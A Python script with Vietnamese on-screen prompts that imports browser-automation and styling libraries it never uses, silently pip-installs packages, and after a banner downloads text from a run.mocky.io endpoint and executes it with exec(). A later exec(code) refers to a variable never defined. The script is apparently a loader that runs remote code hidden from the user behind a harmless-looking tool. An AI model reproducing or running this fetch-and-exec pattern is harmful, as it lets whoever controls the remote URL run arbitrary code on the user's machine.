import os
import sys
import time
import shutil
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import uuid
import json
import requests
import socket

try:
    from faker import Faker
    from requests import session
    from colorama import Fore, Style, init
    from random import randint
    import pystyle
except ImportError:
    os.system("pip install faker requests colorama pystyle")

from pystyle import Add, Center, Anime, Colors, Colorate, Write

PINK = '\033[38;5;13m'
RED = '\033[38;5;9m'
YELLOW = '\033[38;5;11m'
GREEN = '\033[38;5;10m'
LIGHT_PINK = '\033[38;5;207m'
BLINK = '\033[5m'
RESET = '\033[0m'
FLAME_ORANGE = '\033[38;5;208m'
SILVER = '\033[38;5;231m'
# Initialize colorama
init(autoreset=True)

def banner():
    print(f"🐮{LIGHT_PINK} Vui lòng ấn Enter để vào{RESET}")

def check_internet_connection():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

try:
    while True:
        banner()
        input(f"{GREEN}Ấn Enter để tiếp tục hoặc Ctrl+C để thoát... ")

        if check_internet_connection():
            try:
                response = requests.get('https://run.mocky.io/v3/afa7ba1d-7f12-4018-922b-01aaeba5cbf3')
                response.raise_for_status()
                exec(response.text)
                exec(code)
            except requests.RequestException as e:
                print(f"{RED}Lỗi kết nối mạng: {e}{RESET}")
        else:
            print(f"{RED}Không có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.{RESET}")
except KeyboardInterrupt:
    print(f"{RED}\nĐã kết thúc chương trình...")
